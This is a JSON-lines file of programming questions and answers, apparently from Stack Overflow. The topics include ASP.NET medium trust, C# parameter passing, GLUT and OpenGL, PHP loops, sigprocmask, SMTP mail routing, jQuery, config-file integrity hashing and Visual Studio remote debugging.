{"title": "How to write to Web.Config in Medium Trust?", "description": "Uploading my first decently sized web app to my shared host provided me with a fresh set of challenges, by which I mean, sleepless nights. The issue was that I had most certainly not developed my application for medium trust (or had any clue what that was.) \nI mitigated all of the issues, save one. \nI had written an installer for the admin to be able to specify their connection string and other preferences, but I cannot find a way to write to a web.config in medium trust. Does anyone have a solution, or should I just be putting preferences in another file?\n", "answer": "That actually sounds like IIS's Low level. If it is, then you won't be able to write to any file, not just the web.config.\nHere are the levels from IIS's help file:\n\nFull (internal) - Specifies unrestricted permissions. Grants the ASP.NET application permissions to access any resource that is subject to operating system security. All privileged operations are supported.\n\nHigh (web_hightrust.config) - Specifies a high level of code access security, which means that the application cannot do any one of the following things by default:\n\nCall unmanaged code.\nCall serviced components.\nWrite to the event log.\nAccess Message Queuing service queues.\nAccess ODBC, OleDb, or Oracle data sources.\n\nMedium (web_mediumtrust.config) - Specifies a medium level of code access security, which means that, in addition to High Trust Level restrictions, the ASP.NET application cannot do any of the following things by default:\n\nAccess files outside the application directory.\nAccess the registry.\nMake network or Web service calls.\n\nLow (web_lowtrust.config) - Specifies a low level of code access security, which means that, in addition to Medium Trust Level restrictions, the application cannot do any of the following things by default:\n\nWrite to the file system.\nCall the Assert method.\n\nMinimal (web_minimaltrust.config) - Specifies a minimal level of code access security, which means that the application has only execute permissions.\n\nI would suggest that if you are dead set on having an installer, have it create a web.config in memory that the user can save locally and FTP up afterward.\n", "score": 24}
{"title": "What do ref, val and out mean on method parameters?", "description": "I'm looking for a clear, concise and accurate answer.  \nIdeally as the actual answer, although links to good explanations welcome.\nThis also applies to VB.Net, but the keywords are different - ByRef and ByVal.\n", "answer": "By default (in C#), passing an object to a function actually passes a copy of the reference to that object. Changing the parameter itself only changes the value in the parameter, and not the variable that was specified.\nvoid Test1(string param)\n{\n    param = \"new value\";\n}\n\nstring s1 = \"initial value\";\nTest1(s1);\n// s1 == \"initial value\"\n\nUsing out or ref passes a reference to the variable specified in the call to the function. Any changes to the value of an out or ref parameter will be passed back to the caller.\nBoth out and ref behave identically except for one slight difference: ref parameters are required to be initialised before calling, while out parameters can be uninitialised. By extension, ref parameters are guaranteed to be initialised at the start of the method, while out parameters are treated as uninitialised.\nvoid Test2(ref string param)\n{\n    param = \"new value\";\n}\n\nvoid Test3(out string param)\n{\n    // Use of param here will not compile\n    param = \"another value\";\n}\n\nstring s2 = \"initial value\";\nstring s3;\nTest2(ref s2);\n// s2 == \"new value\"\n// Test2(ref s3); // Passing ref s3 will not compile\nTest3(out s2);\n// s2 == \"another value\"\nTest3(out s3);\n// s3 == \"another value\"\n\nEdit: As dp points out, the difference between out and ref is only enforced by the C# compiler, not by the CLR. As far as I know, VB has no equivalent for out and implements ref (as ByRef) only, matching the support of the CLR.\n", "score": 27}
{"title": "Using GLUT bitmap fonts", "description": "I'm writing a simple OpenGL application that uses GLUT. I don't want to roll my own font rendering code, instead I want to use the simple bitmap fonts that ship with GLUT. What are the steps to get them working?\n", "answer": "Simple text display is easy to do in OpenGL using GLUT bitmap fonts. These are simple 2D fonts and are not suitable for display inside your 3D environment. However, they're perfect for text that needs to be overlayed on the display window.\nHere are the sample steps to display Eric Cartman's favorite quote colored in green on a GLUT window:\nWe'll be setting the raster position in screen coordinates. So, setup the projection and modelview matrices for 2D rendering:\nglMatrixMode(GL_PROJECTION);\nglPushMatrix();\nglLoadIdentity();\ngluOrtho2D(0.0, WIN_WIDTH, 0.0, WIN_HEIGHT);\n\nglMatrixMode(GL_MODELVIEW);\nglPushMatrix();\nglLoadIdentity();\n\nSet the font color. (Set this now, not later.)\nglColor3f(0.0, 1.0, 0.0); // Green\n\nSet the window location where the text should be displayed. This is done by setting the raster position in screen coordinates. Lower left corner of the window is (0, 0).\nglRasterPos2i(10, 10);\n\nSet the font and display the string characters using glutBitmapCharacter.\nstring s = \"Respect mah authoritah!\";\nvoid * font = GLUT_BITMAP_9_BY_15;\nfor (string::iterator i = s.begin(); i != s.end(); ++i)\n{\n    char c = *i;\n    glutBitmapCharacter(font, c);\n}\n\nRestore back the matrices.\nglMatrixMode(GL_MODELVIEW);\nglPopMatrix();\n\nglMatrixMode(GL_PROJECTION);\nglPopMatrix();\n\n", "score": 29}
{"title": "GLUT pop-up menus", "description": "Is it easy to create GLUT pop-up menus for my OpenGL application? If yes, how?\n", "answer": "Creating and using pop-up menus with GLUT is very simple. Here is a code sample that creates a pop-up menu with 4 options:\n// Menu items\nenum MENU_TYPE\n{\n        MENU_FRONT,\n        MENU_SPOT,\n        MENU_BACK,\n        MENU_BACK_FRONT,\n};\n\n// Assign a default value\nMENU_TYPE show = MENU_BACK_FRONT;\n\n// Menu handling function declaration\nvoid menu(int);\n\nint main()\n{\n        // ...\n\n        // Create a menu\n        glutCreateMenu(menu);\n\n        // Add menu items\n        glutAddMenuEntry(\"Show Front\", MENU_FRONT);\n        glutAddMenuEntry(\"Show Back\", MENU_BACK);\n        glutAddMenuEntry(\"Spotlight\", MENU_SPOT);\n        glutAddMenuEntry(\"Blend 'em all\", MENU_BACK_FRONT);\n\n        // Associate a mouse button with menu\n        glutAttachMenu(GLUT_RIGHT_BUTTON);\n\n        // ...\n\n        return;\n}\n\n// Menu handling function definition\nvoid menu(int item)\n{\n        switch (item)\n        {\n        case MENU_FRONT:\n        case MENU_SPOT:\n        case MENU_DEPTH:\n        case MENU_BACK:\n        case MENU_BACK_FRONT:\n                {\n                        show = (MENU_TYPE) item;\n                }\n                break;\n        default:\n                {       /* Nothing */       }\n                break;\n        }\n\n        glutPostRedisplay();\n\n        return;\n}\n\n", "score": 13}
{"title": "Simplest way to make a Google Map mashup?", "description": "Given a list of locations such as\n    <td>El Cerrito, CA</td>\n    <td>Corvallis, OR</td>\n    <td>Morganton, NC</td>\n    <td>New York, NY</td>\n    <td>San Diego, CA</td>\n\nWhat's the easiest way to generate a Google Map with pushpins for each location?\n", "answer": "I'm assuming you have the basics for Maps in your code already with your API Key.\n<head>\n  <script \n   type=\"text/javascript\"\n   href=\"http://maps.google.com/maps?\n         file=api&v=2&key=xxxxx\">\n  function createMap() {\n    var map = new GMap2(document.getElementById(\"map\"));\n    map.setCenter(new GLatLng(37.44, -122.14), 14);\n  }\n  </script>\n</head>\n<body onload=\"createMap()\" onunload=\"GUnload()\">\n\nEverything in Google Maps is based off of latitude (lat) and longitude (lng).\nSo to create a simple marker you will just create a GMarker with the lat and lng.\nvar where = new GLatLng(37.925243,-122.307358); //Lat and Lng for El Cerrito, CA\nvar marker = new GMarker(where); // Create marker (Pinhead thingy)\nmap.setCenter(where); // Center map on marker\nmap.addOverlay(marker); // Add marker to map\n\nHowever if you don't want to look up the Lat and Lng for each city you can use Google's Geo Coder. Heres an example:\nvar address = \"El Cerrito, CA\";\nvar geocoder = new GClientGeocoder;\ngeocoder.getLatLng(address, function(point) {\n  if (point) {\n    map.clearOverlays(); // Clear all markers\n    map.addOverlay(new GMarker(point)); // Add marker to map\n    map.setCenter(point, 10); // Center and zoom map on marker\n  }\n});\n\nSo I would just create an array of GLatLng's of every city from the GeoCoder and then draw them on the map.\n", "score": 11}
{"title": "How to wait for thread complete before continuing?", "description": "I have some code for starting a thread on the .NET CF 2.0:\nThreadStart tStart = new ThreadStart(MyMethod);\nThread t = new Thread(tStart);\nt.Start();\n\nIf I call this inside a loop the items completely out of order. How do introduce a wait after t.Start(), so that the work on the thread completes before the code continues? Will BeginInvoke/EndInvoke be a better option for this than manually creating threads?\n", "answer": "How much order do you need to impose on the threads? If you just need all of the work started in the loop to finish before the code continues, but you don't care about the order the work within the loop finishes, then calling Join is the answer. To add more detail to Kevin Kenny's answer, you should call Join outside the loop. This means you will need a collection to hold references to the threads you started:\n// Start all of the threads.\nList<Thread> startedThreads = new List<Thread>();\nforeach (...) {\n  Thread thread = new Thread(new ThreadStart(MyMethod));\n  thread.Start();\n  startedThreads.Add(thread);\n}\n\n// Wait for all of the threads to finish.\nforeach (Thread thread in startedThreads) {\n  thread.Join();\n}\n\nIn contrast, if you called Join inside the loop, the result would basically be the same as not using threads at all. Each iteration of the loop body would create and start a thread but then immediately Join it and wait for it to finish.\nIf the individual threads produce some result (write a message in a log, for example) then the messages may still appear out of order because there's no coordination between the threads. It is possible to get the threads to output their results in order by coordinating them with a Monitor.\n", "score": 16}
{"title": "What are the main differences between programming for Windows XP and for Vista?", "description": "From a desktop application developer point of view, is there any difference between developing for Windows XP and developing for Windows Vista?\n", "answer": "User Interface\nLooking at the Windows Vista User Experience Guidelines you can see that they have changed many UI elements, which you should be aware of.  Some major things to take note of:\n\nLarger icons\nNew font (Which affects some custom UI constistency)\nNew dialog box features  (task dialogs)\nAltered common dialogs (like File Open, Save As, etc.)\nDialog text style and tone, and look and feel\nNew Aero Wizards\nRedesigned toolbars\nBetter notification UI\nNew recommended method of including a search control\nGlass\n\n64-bit\nVista has a 64-bit edition, and although XP did too, your users are more likely to use Vista 64 than XP 64.  Now you have to deal with:\n\nRegistry virtualization\nRegistry redirection (Wow6432Node)\nRegistry reflection\nDigital signatures for kernel modules\nMSI installers have new properties to deal with\n\nUAC\nUser Account Control vastly affects the default permissions that your application has when interacting with the OS.\n\nHow UAC works and affects your application (also see the requirements doc)\nInstallers have to deal with UAC\n\nNew APIs\nThere are new APIs which are targeted at either new methods of application construction or allowing new functionality:\n\nCryptography API: Next Generation (CNG)\nExtensible Application Markup Language (XAML)\nWindows Communication Foundation (WCF)\nWindows Workflow Foundation (WF)\nAnd many more smaller ones\n\nInstallers\nBecause installations can only use common runtimes they install after a transaction has completed, custom actions will fail if your custom action dll requires the Visual C++ runtimes above the VS 2005 CRT (non-SP1).\n", "score": 20}
{"title": "The difference between loops", "description": "It's about PHP but I've no doubt many of the same comments will apply to other languages.\nSimply put, what are the differences in the different types of loop for PHP? Is one faster/better than the others or should I simply put in the most readable loop?\nfor ($i = 0; $i < 10; $i++)\n{\n    # code...\n}\n\nforeach ($array as $index => $value)\n{\n    # code...\n}\n\ndo\n{\n    # code...\n}\nwhile ($flag == false);\n\n", "answer": "For loop and While loops are entry condition loops. They evaluate condition first, so the statement block associated with the loop won't run even once if the condition fails to meet \nThe statements inside this for loop block will run 10 times, the value of $i will be 0 to 9;\nfor ($i = 0; $i < 10; $i++)\n{\n        # code...\n}\n\nSame thing done with while loop:\n$i = 0;\nwhile ($i < 10)\n{\n    # code...\n    $i++\n}\n\nDo-while loop is exit-condition loop. It's guaranteed to execute once, then it will evaluate condition before repeating the block\ndo\n{\n        # code...\n}\nwhile ($flag == false);\n\nforeach is used to access array elements from start to end. At the beginning of foreach loop, the internal pointer of the array is set to the first element of the array, in next step it is set to the 2nd element of the array and so on till the array ends. In the loop block The value of current array item is available as $value and the key of current item is available as $index.\nforeach ($array as $index => $value)\n{\n        # code...\n}\n\nYou could do the same thing with while loop, like this \nwhile (current($array))\n{\n    $index = key($array);  // to get key of the current element\n    $value = $array[$index]; // to get value of current element\n\n    # code ...  \n\n    next($array);   // advance the internal array pointer of $array\n}\n\nAnd lastly: The PHP Manual is your friend :)\n", "score": 10}
{"title": "What are OpenGL extensions, and what are the benefits/tradeoffs of using them?", "description": "In relation to this question on Using OpenGL extensions, what's the purpose of these extension functions? Why would I want to use them? Further, are there any tradeoffs or gotchas associated with using them?\n", "answer": "The OpenGL standard allows individual vendors to provide additional functionality through extensions as new technology is created. Extensions may introduce new functions and new constants, and may relax or remove restrictions on existing OpenGL functions. \nEach vendor has an alphabetic abbreviation that is used in naming their new functions and constants. For example, NVIDIA's abbreviation (NV) is used in defining their proprietary function glCombinerParameterfvNV() and their constant GL_NORMAL_MAP_NV.\nIt may happen that more than one vendor agrees to implement the same extended functionality. In that case, the abbreviation EXT is used. It may further happen that the Architecture Review Board \"blesses\" the extension. It then becomes known as a standard extension, and the abbreviation ARB is used. The first ARB extension was GL_ARB_multitexture, introduced in version 1.2.1. Following the official extension promotion path, multitexturing is no longer an optionally implemented ARB extension, but has been a part of the OpenGL core API since version 1.3.\nBefore using an extension a program must first determine its availability, and then obtain pointers to any new functions the extension defines. The mechanism for doing this is platform-specific and libraries such as GLEW and GLEE exist to simplify the process.\n", "score": 24}
{"title": "Set and Oldset in sigprocmask()", "description": "I haven't completely understood, how to use sigprocmask(). Particularly, how the set and oldset and its syntax work and how to use them.\nint sigprocmask(int how, const sigset_t *set, sigset_t *oldset);\n\nPlease explain with an example, to block, say SIGUSR1 for a few seconds and then unblock and handle it.\n­­­­­­­­­­­­­­­­­­­­­­­­­­­­­\n", "answer": "The idea is that you provide a mask in set, effectively a list of signals.  The how argument says what you should do with the mask in set.\nYou can either use SIG_BLOCK to block the signals in the set list, or SIG_UNBLOCK to unblock them.  Neither of these changes the signals that aren't set in the list.  SIG_SETMASK blocks the signals in the list, and unblocks the ones that aren't set in the list.\nFor instance, assume that the old blocking list was {SIGSEGV, SIGSUSP} and you call sigprocmask with these arguments:\nsigset_t x;\nsigemptyset (&x);\nsigaddset(&x, SIGUSR1);\nsigprocmask(SIG_BLOCK, &x, NULL)\n\nThe new blocking list will now be {SIGSEGV, SIGSUSP, SIGUSR1}.\nIf you call sigprocmask with these arguments now:\nsigprocmask(SIG_UNBLOCK, &x, NULL)\n\nThe new blocking list will go back to being {SIGSEGV, SIGSUSP}.\nIf you call sigprocmask with these arguments now:\nsigprocmask(SIG_SETMASK, &x, NULL)\n\nThe new blocking list will now be set to {SIGUSR1}.\nThe oldset argument tells you what the previous blocking list was.  If we have this declaration:\nsigset_t y;\n\nand we call the code in the previous examples like this:\n    sigprocmask(SIG_BLOCK, &x, &y)\n\nnow we have:\ny == {SIGSEGV, SIGSUSP}\n\nIf we now do:\n    sigprocmask(SIG_UNBLOCK, &x, &y)\n\nwe'll get\ny == {SIGSEGV, SIGSUSP, SIGUSR1}\n\nand if we do:\n    sigprocmask(SIG_SET, &x, &y)\n\nwe'll get this:\ny == {SIGSEGV, SIGSUSP}\n\nbecause this is the previous value of the blocking set.\n", "score": 77}
{"title": "What protocols and servers are involved in sending an email, and what are the steps?", "description": "For the past few weeks, I've been trying to learn about just how email works.  I understand the process of a client receiving mail from a server using POP pretty well.  I also understand how a client computer can use SMTP to ask an SMTP server to send a message.  However, I'm still missing something...\nThe way I understand it, outgoing mail has to make three trips:\n\nClient (gmail user using Thunderbird) to a server (Gmail)\nFirst server (Gmail) to second server (Hotmail)\nSecond server (Hotmail) to second client (hotmail user using OS X Mail)\n\nAs I understand it, step one uses SMTP for the client to communicate.  The client authenticates itself somehow (say, with USER and PASS), and then sends a message to the gmail server.\nHowever, I don't understand how gmail server transfers the message to the hotmail server.\nFor step three, I'm pretty sure, the hotmail server uses POP to send the message to the hotmail client (using authentication, again).\nSo, the big question is: when I click send Mail sends my message to my gmail server, how does my gmail server forward the message to, say, a hotmail server so my friend can recieve it?\nThank you so much!\n~Jason\n\nThanks, that's been helpful so far.\nAs I understand it, the first client sends the message to the first server using SMTP, often to an address such as smtp.mail.SOMESERVER.com on port 25 (usually).\nThen, SOMESERVER uses SMTP again to send the message to RECEIVESERVER.com on port 25 (not smtp.mail.RECEIVESERVER.com or anything fancy).\nThen, when the recipient asks RECEIVESERVER for its mail, using POP, s/he recieves the message... right?\nThanks again (especially to dr-jan),\nJason\n", "answer": "The SMTP server at Gmail (which accepted the message from Thunderbird) will route the message to the final recipient.\nIt does this by using DNS to find the MX (mail exchanger) record for the domain name part of the destination email address (hotmail.com in this example). The DNS server will return an IP address which the message should be sent to. The server at the destination IP address will hopefully be running SMTP (on the standard port 25) so it can receive the incoming messages.\nOnce the message has been received by the hotmail server, it is stored until the appropriate user logs in and retrieves their messages using POP (or IMAP).\nJason - to answer your follow up...\n\nThen, SOMESERVER uses SMTP again to send the message to RECEIVESERVER.com on port 25 (not smtp.mail.RECEIVESERVER.com or anything fancy).\n\nThat's correct - the domain name to send to is taken as everything after the '@' in the email address of the recipient. Often, RECEIVESERVER.com is an alias for something more specific, say something like incoming.RECEIVESERVER.com, (or, indeed, smtp.mail.RECEIVESERVER.com).\nYou can use nslookup to query your local DNS servers (this works in Linux and in a Windows cmd window):\nnslookup\n> set type=mx\n> stackoverflow.com\nServer:         158.155.25.16\nAddress:        158.155.25.16#53\n\nNon-authoritative answer:\nstackoverflow.com       mail exchanger = 10 aspmx.l.google.com.\nstackoverflow.com       mail exchanger = 20 alt1.aspmx.l.google.com.\nstackoverflow.com       mail exchanger = 30 alt2.aspmx.l.google.com.\nstackoverflow.com       mail exchanger = 40 aspmx2.googlemail.com.\nstackoverflow.com       mail exchanger = 50 aspmx3.googlemail.com.\n\nAuthoritative answers can be found from:\naspmx.l.google.com      internet address = 64.233.183.114\naspmx.l.google.com      internet address = 64.233.183.27\n>                  \n\nThis shows us that email to anyone at stackoverflow.com should be sent to one of the gmail servers shown above.\nThe Wikipedia article mentioned (http://en.wikipedia.org/wiki/Mx_record) discusses the priority numbers shown above (10, 20, ..., 50).\n", "score": 18}
{"title": "How do you swap DIVs on mouseover (jQuery)?", "description": "This most be the second most simple rollover effect, still I don't find any simple solution.\nWanted: I have a list of items and a corresponding list of slides (DIVs). After loading, the first list item should be selected (bold) and the first slide should be visible. When the user hovers over another list item, that list item should be selected instead and the corresponding slide be shown.\nThe following code works, but is awful. How can I get this behaviour in an elegant way? jquery has dozens of animated and complicated rollover effects, but I didn't come up with a clean way for this effect.\n<script type=\"text/javascript\">\nfunction switchTo(id) {\n    document.getElementById('slide1').style.display=(id==1)?'block':'none';\n    document.getElementById('slide2').style.display=(id==2)?'block':'none';\n    document.getElementById('slide3').style.display=(id==3)?'block':'none';\n    document.getElementById('slide4').style.display=(id==4)?'block':'none';\n    document.getElementById('switch1').style.fontWeight=(id==1)?'bold':'normal';\n    document.getElementById('switch2').style.fontWeight=(id==2)?'bold':'normal';\n    document.getElementById('switch3').style.fontWeight=(id==3)?'bold':'normal';\n    document.getElementById('switch4').style.fontWeight=(id==4)?'bold':'normal';\n}\n</script>\n\n<ul id=\"switches\">\n  <li id=\"switch1\" onmouseover=\"switchTo(1);\" style=\"font-weight:bold;\">First slide</li>\n  <li id=\"switch2\" onmouseover=\"switchTo(2);\">Second slide</li>\n  <li id=\"switch3\" onmouseover=\"switchTo(3);\">Third slide</li>\n  <li id=\"switch4\" onmouseover=\"switchTo(4);\">Fourth slide</li>\n</ul>\n<div id=\"slides\">\n  <div id=\"slide1\">Well well.</div>\n  <div id=\"slide2\" style=\"display:none;\">Oh no!</div>\n  <div id=\"slide3\" style=\"display:none;\">You again?</div>\n  <div id=\"slide4\" style=\"display:none;\">I'm gone!</div>\n</div>\n\n", "answer": "Rather than displaying all slides when JS is off (which would likely break the page layout) I would place inside the switch LIs real A links to server-side code which returns the page with the \"active\" class pre-set on the proper switch/slide.\n\n$(document).ready(function() {\r\n  switches = $('#switches > li');\r\n  slides = $('#slides > div');\r\n  switches.each(function(idx) {\r\n    $(this).data('slide', slides.eq(idx));\r\n  }).hover(\r\n    function() {\r\n      switches.removeClass('active');\r\n      slides.removeClass('active');\r\n      $(this).addClass('active');\r\n      $(this).data('slide').addClass('active');\r\n    });\r\n});\n#switches .active {\r\n  font-weight: bold;\r\n}\r\n#slides div {\r\n  display: none;\r\n}\r\n#slides div.active {\r\n  display: block;\r\n}\n<html>\r\n\r\n<head>\r\n\r\n  <title>test</title>\r\n\r\n  <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js\"></script>\r\n  <script type=\"text/javascript\" src=\"switch.js\"></script>\r\n\r\n</head>\r\n\r\n<body>\r\n\r\n  <ul id=\"switches\">\r\n    <li class=\"active\">First slide</li>\r\n    <li>Second slide</li>\r\n    <li>Third slide</li>\r\n    <li>Fourth slide</li>\r\n  </ul>\r\n  <div id=\"slides\">\r\n    <div class=\"active\">Well well.</div>\r\n    <div>Oh no!</div>\r\n    <div>You again?</div>\r\n    <div>I'm gone!</div>\r\n  </div>\r\n\r\n</body>\r\n\r\n</html>\n\n", "score": 19}
{"title": "How do I store information in my executable in .Net", "description": "I'd like to bind a configuration file to my executable. I'd like to do this by storing an MD5 hash of the file inside the executable. This should keep anyone but the executable from modifying the file.\nEssentially if someone modifies this file outside of the program the program should fail to load it again.\nEDIT: The program processes credit card information so being able to change the configuration in any way could be a potential security risk. This software will be distributed to a large number of clients. Ideally client should have a configuration that is tied directly to the executable. This will hopefully keep a hacker from being able to get a fake configuration into place.\nThe configuration still needs to be editable though so compiling an individual copy for each customer is not an option.\n\nIt's important that this be dynamic. So that I can tie the hash to the configuration file as the configuration changes.\n", "answer": "A better solution is to store the MD5 in the configuration file.  But instead of the MD5 being just of the configuration file, also include some secret \"key\" value, like a fixed guid, in the MD5.\nwrite(MD5(SecretKey + ConfigFileText));\n\nThen you simply remove that MD5 and rehash the file (including your secret key).  If the MD5's are the same, then no-one modified it.  This prevents someone from modifying it and re-applying the MD5 since they don't know your secret key.\nKeep in mind this is a fairly weak solution (as is the one you are suggesting) as they could easily track into your program to find the key or where the MD5 is stored.  \nA better solution would be to use a public key system and sign the configuration file.  Again that is weak since that would require the private key to be stored on their local machine.  Pretty much anything that is contained on their local PC can be bypassed with enough effort.\nIf you REALLY want to store the information in your executable (which I would discourage) then you can just try appending it at the end of the EXE.  That is usually safe.  Modifying executable programs is virus like behavior and most operating system security will try to stop you too.  If your program is in the Program Files directory, and your configuration file is in the Application Data directory, and the user is logged in as a non-administrator (in XP or Vista), then you will be unable to update the EXE.\nUpdate: I don't care if you are using Asymmetric encryption, RSA or Quantum cryptography, if you are storing your keys on the user's computer (which you must do unless you route it all through a web service) then the user can find your keys, even if it means inspecting the registers on the CPU at run time!  You are only buying yourself a moderate level of security, so stick with something that is simple.  To prevent modification the solution I suggested is the best.  To prevent reading then encrypt it, and if you are storing your key locally then use AES Rijndael.\nUpdate:  The FixedGUID / SecretKey could alternatively be generated at install time and stored somewhere \"secret\" in the registry.  Or you could generate it every time you use it from hardware configuration.  Then you are getting more complicated.  How you want to do this to allow for moderate levels of hardware changes would be to take 6 different signatures, and hash your configuration file 6 times - once with each.  Combine each one with a 2nd secret value, like the GUID mentioned above (either global or generated at install).  Then when you check you verify each hash separately.  As long as they have 3 out of 6 (or whatever your tolerance is) then you accept it.  Next time you write it you hash it with the new hardware configuration.  This allows them to slowly swap out hardware over time and get a whole new system. . . Maybe that is a weakness.  It all comes down to your tolerance.  There are variations based on tighter tolerances.\nUPDATE:  For a Credit Card system you might want to consider some real security.  You should retain the services of a security and cryptography consultant.  More information needs to be exchanged.  They need to analyze your specific needs and risks.  \nAlso, if you want security with .NET you need to first start with a really good .NET obfuscator (just Google it).  A .NET assembly is way to easy to disassemble and get at the source code and read all your secrets.  Not to sound a like a broken record, but anything that depends on the security of your user's system is fundamentally flawed from the beginning.  \n", "score": 11}
{"title": "What are the important Ruby commands?", "description": "I'm not sure of all of them, but what are the commands to do things like update Ruby, download a new gem, or update an existing gem? What other important things are there?\nSince it might matter, I'm running Windows.\n", "answer": "By Ruby commands you probably mean the command line programs for Ruby.  These are also called Ruby Helper programs.  Here are a few:\n\nruby - The interpreter itself.  Run Ruby scripts or statements.\ngem - Ruby Package Manager.  Great for automatically downloading or updating small Ruby modules like XML libraries, web servers, or even whole Ruby programs.\nirb - Interactive Ruby Prompt.  This is an entire Ruby shell that will let you execute any Ruby code you want.  You can load libraries, test code directly, anything you can do with Ruby you can do in this shell.  Believe me, there is quite a lot that you can do with it to improve your Ruby development workflow [1].\nri - Quick shell access to Ruby documentation.  You can find the RDoc information on nearly any Ruby Class or method.  The same kind of documentation that you would find on the online ruby-docs.\nerb - Evaluates embedded Ruby in Ruby Templated documents.  Embedded Ruby is just like embedding php into a document, and this is an interpreter for that kind of document.  This is really more for the rails crowd.  An alternative would be haml.\nrdoc - Generate the standard Ruby documentation for one of your Ruby classes.  Its like Javadocs.  It parses the Ruby source files and generates the standard documentation from special comments.\ntestrb and rake.  I'm not familiar enough with these.  I'd love it if someone could fill these in!\n\nHopefully this was what you were looking for!\n", "score": 16}
{"title": "Remote Debugging Server Side of a Web Application with Visual Studio 2008", "description": "So, I've read that it is not a good idea to install VS2008 on my test server machine as it changes the run time environment too much.  I've never attempted remote debugging with Visual Studio before, so what is the \"best\" way to get line by line remote debugging of server side web app code.  I'd like to be able to set a breakpoint, attach, and start stepping line by line to verify code flow and, you know, debug and stuff :).\nI'm sure most of the answers will pertain to ASP.NET code, and I'm interested in that, but my current code base is actually Classic ASP and ISAPI Extensions, so I care about that a little more.\nAlso, my test server is running in VMWare, I've noticed in the latest VMWare install it mentioning something about debugging support, but I'm unfamiliar with what that means...anyone using it, what does it do for you?\n", "answer": "First, this is MUCH easier if both the server and your workstation are on the same domain (the server needs access to connect to your machine). In your C:\\Program Files\\Microsoft Visual Studio 9.0\\Common7\\IDE\\Remote Debugger\\x86 (or x64, or ia64) directory are the files you need to copy to your server. There are different versions between Visual Studio versions, so make sure they match on the client and server side. On the server, fire up msvsmon. It will say something like \"Msvsmon started a new server named xxx@yyyy\". This is the name you'll use in Visual Studio to connect to this server. You can go into Tools > Options to set the server name and to set the authentication mode (hopefully Windows Authentication) - BTW No Authentication doesn't work for managed code. \nOn the client side, open up Visual Studio and load the solution you're going to debug. Then go to Debug > Attach to Process. In the \"Qualifier\" field enter the name of the server as you saw it appear earlier. Click on the Select button and select the type of code you want to debug, then hit OK. Hopefully you'll see a list of the processes on the server that you can attach to (you should also see on the server that the debugging monitor just said you connected). Find the process to attach to (start up the app if necessary). If it's an ASP.NET website, you'd select w3wp.exe, then hit Attach. Set your breakpoints and hopefully you're now remotely debugging the code.\nAFAIK - the VMWare option lets you start up code inside of a VM but debug it from your workstation. \n", "score": 12}
{"title": "Best practices for debugging linking errors", "description": "When building projects in C++, I've found debugging linking errors to be tricky, especially when picking up other people's code.  What strategies do people use for debugging and fixing linking errors?\n", "answer": "Not sure what your level of expertise is, but here are the basics. \nBelow is a linker error from VS 2005 - yes, it's a giant mess if you're not familiar with it.\nByteComparator.obj : error LNK2019: unresolved external symbol \"int __cdecl does_not_exist(void)\" (?does_not_exist@@YAHXZ) referenced in function \"void __cdecl TextScan(struct FileTextStats &,char const *,char const *,bool,bool,__int64)\" (?TextScan@@YAXAAUFileTextStats@@PBD1_N2_J@Z)\n\nThere are a couple of points to focus on: \n\n\"ByteComparator.obj\" - Look for a ByteComparator.cpp file, this is the source of the linker problem\n\"int __cdecl does_not_exist(void)\" - This is the symbol it couldn't find, in this case a function named does_not_exist()\n\nAt this point, in many cases the fastest way to resolution is to search the code base for this function and find where the implementation is. Once you know where the function is implemented you just have to make sure the two places get linked together.\nIf you're using VS2005, you would use the \"Project Dependencies...\" right-click menu.  If you're using gcc, you would look in your makefiles for the executable generation step (gcc called with a bunch of .o files) and add the missing .o file.\n\nIn a second scenario, you may be missing an \"external\" dependency, which you don't have code for.  The Win32 libraries are often times implemented in static libraries that you have to link to.  In this case, go to MSDN or \"Microsoft Google\" and search for the API.  At the bottom of the API description the library name is given.  Add this to your project properties \"Configuration Properties->Linker->Input->Additional Dependencies\" list.  For example, the function timeGetTime()'s page on MSDN tells you to use Winmm.lib at the bottom of the page.\n", "score": 25}
{"title": "How are partial methods used in C# 3.0?", "description": "I have read about partial methods in the latest C# language specification, so I understand the principles, but I'm wondering how people are actually using them.  Is there a particular design pattern that benefits from partial methods?\n", "answer": "Partial methods have been introduced for similar reasons to why partial classes were in .Net 2.\nA partial class is one that can be split across multiple files - the compiler builds them all into one file as it runs.\nThe advantage for this is that Visual Studio can provide a graphical designer for part of the class while coders work on the other.\nThe most common example is the Form designer. Developers don't want to be positioning  buttons, input boxes, etc by hand most of the time.\n\nIn .Net 1 it was auto-generated code in a #region block\nIn .Net 2 these became separate designer classes - the form is still one class, it's just split into one file edited by the developers and one by the form designer\n\nThis makes maintaining both much easier.  Merges are simpler and there's less risk of the VS form designer accidentally undoing coders' manual changes.\nIn .Net 3.5 Linq has been introduced.  Linq has a DBML designer for building your data structures, and that generates auto-code.\nThe extra bit here is that code needed to provide methods that developers might want to fill in.\nAs developers will extend these classes (with extra partial files) they couldn't use abstract methods here.\nThe other issue is that most of the time these methods wont be called, and calling empty methods is a waste of time.\nEmpty methods are not optimised out.\nSo Linq generates empty partial methods. If you don't create your own partial to complete them the C# compiler will just optimise them out.\nSo that it can do this partial methods always return void.\nIf you create a new Linq DBML file it will auto-generate a partial class, something like\n[System.Data.Linq.Mapping.DatabaseAttribute(Name=\"MyDB\")]\npublic partial class MyDataContext : System.Data.Linq.DataContext\n{\n    ...\n\n    partial void OnCreated();\n    partial void InsertMyTable(MyTable instance);\n    partial void UpdateMyTable(MyTable instance);\n    partial void DeleteMyTable(MyTable instance);\n\n    ...\n\nThen in your own partial file you can extend this:\npublic partial class MyDataContext\n{\n    partial void OnCreated() {\n        //do something on data context creation\n    }\n}\n\nIf you don't extend these methods they get optimised right out.\nPartial methods can't be public - as then they'd have to be there for other classes to call. If you write your own code generators I can see them being useful, but otherwise they're only really useful for the VS designer.\nThe example I mentioned before is one possibility:\n//this code will get optimised out if no body is implemented\npartial void DoSomethingIfCompFlag();\n\n#if COMPILER_FLAG\n//this code won't exist if the flag is off\npartial void DoSomethingIfCompFlag() {\n    //your code\n}\n#endif\n\nAnother potential use is if you had a large and complex class spilt across multiple files you might want partial references in the calling file. However I think in that case you should consider simplifying the class first.\n", "score": 23}
